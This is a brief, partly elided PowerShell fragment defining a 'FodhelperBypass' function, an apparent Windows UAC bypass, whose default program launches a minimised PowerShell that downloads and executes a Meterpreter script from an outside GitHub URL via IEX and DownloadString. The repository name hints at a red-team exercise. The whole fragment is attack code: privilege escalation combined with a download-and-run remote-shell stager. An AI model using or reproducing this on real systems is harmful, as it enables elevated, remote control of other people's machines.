...
function FodhelperBypass(){ 
 Param (
        ...
        [String]$program = "cmd.exe /c start /min powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SanderBougrine-TC/RedvsBlue/main/meterpreter-64.ps1') > C:\temp\test.txt; sleep 360" #default
       )
